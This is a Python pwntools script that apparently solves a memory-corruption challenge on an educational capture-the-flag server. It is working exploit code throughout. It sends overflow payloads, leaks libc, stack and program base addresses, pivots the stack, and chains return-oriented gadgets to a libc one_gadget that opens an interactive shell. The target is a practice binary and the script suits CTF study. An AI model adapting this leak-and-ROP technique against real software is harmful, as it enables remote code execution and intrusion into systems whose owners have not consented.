from pwn import *

r = remote('edu-ctf.zoolab.org',10014)
#r = process('./share/chal')
payload = p64(0) * 3 + int.to_bytes(161,1,'little')
r.send(payload)

r.recv(0x18)
libc_base = u64(r.recv(6) + b'\x00\x00') - 0x240a1
r.recv(0xa)
stack = u64(r.recv(6) + b'\x00\x00') - 0x108    
print(hex(libc_base))
print(hex(stack))

main = libc_base + 0x240a1
pop_rdi_ret = libc_base + 0x23b6a
pop_rsi_ret = libc_base + 0x2601f
leave_ret = libc_base + 0x578c8
pop_rdx_ret = libc_base + 0x142c92
pop_rax_ret = libc_base + 0x36174
syscall_ret = libc_base + 0x630a9
libc_stack = libc_base + 0x1ed000
pop_r12_ret = libc_base + 0x2f709
one_gadget = libc_base + 0xe3afe

r.recv(0x18-0xa)
payload = p64(0) + p64(0)
payload += p64(stack+0x30) 
payload += p64(leave_ret) 
r.send(payload)

r.recv(0x30)

payload = p64(0)*2
payload += p64(stack)
payload += b'\x69'
r.send(payload)

r.recv(0x18)
code_base = u64(r.recv(6) + b'\x00\x00') -  0x1169
print(hex(code_base))

payload = p64(0) * 2
payload += p64(libc_stack)
payload += p64(code_base + 0x1175)

r.send(payload)

r.send(p64(0) * 3 + p64(pop_r12_ret) + p64(0) + p64(one_gadget))

r.interactive()